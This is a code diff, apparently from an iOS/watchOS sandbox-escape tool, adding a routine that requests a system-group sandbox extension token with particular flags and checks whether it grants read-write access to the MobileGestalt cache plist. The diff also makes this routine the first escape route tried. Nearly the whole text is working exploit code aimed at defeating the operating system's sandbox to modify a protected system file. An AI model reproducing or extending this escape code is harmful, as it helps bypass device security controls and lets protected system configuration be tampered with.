@@ -656,6 +656,25 @@ static int64_t bq_escape_worstgestalt_file(NSString *target, NSString **linkOut)
     return -5;
 }
 
+// Differential lower-flag request. Watch6,14 / 23U95 researchers reported
+// a consumable system-group token with flags 0x0800000000 but NO write access.
+// Never accept this token unless the actual file passes O_RDWR.
+static int64_t bq_escape_class13_lowerflag(NSString *target, NSString **linkOut) {
+    if (![target isEqualToString:kMGCaches]) return -1;
+    NSString *p = nil;
+    int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"",
+                                0x0800000000ULL,
+                                @"class13-lowerflag-systemgroup", &p);
+    if (h < 0) return h;
+    NSString *file = [target stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
+    if (bq_access_readwrite(file, @"class13-lowerflag-systemgroup")) {
+        if (linkOut) *linkOut = target;
+        return h;
+    }
+    if (g.release) g.release(h);
+    return -5;
+}
+
 static int64_t bq_escape_geod_published(NSString *target, NSString **linkOut) {
     if (![target isEqualToString:kMGCaches]) return -1;
     NSString *domain = [bq_dots(6) stringByAppendingString:
@@ -693,7 +712,9 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
     // Prefer an exact-file token. All new routes require successful O_RDWR
     // before returning; fallback paths below are independently validated for writes.
     if ([target isEqualToString:kMGCaches]) {
-        int64_t preferred = bq_escape_worstgestalt_file(target, linkOut);
+        int64_t preferred = bq_escape_class13_lowerflag(target, linkOut);
+        if (preferred >= 0) return preferred;
+        preferred = bq_escape_worstgestalt_file(target, linkOut);
         if (preferred >= 0) return preferred;
         preferred = bq_escape_geod_published(target, linkOut);
         if (preferred >= 0) return preferred;
